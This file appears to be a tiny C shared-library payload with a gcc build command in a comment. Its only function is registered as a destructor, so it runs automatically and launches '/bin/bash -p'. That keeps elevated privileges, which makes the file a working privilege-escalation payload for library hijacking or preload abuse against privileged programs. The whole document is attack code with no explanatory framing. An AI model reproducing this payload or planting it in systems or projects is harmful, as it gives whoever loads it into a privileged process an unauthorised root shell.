#include <unistd.h>

// gcc -shared -o shared.so -fPIC shared.lib.c 

void main(void) __attribute__((destructor));

void main(void) {
    execlp("/bin/bash", "bash", "-p", NULL);
}
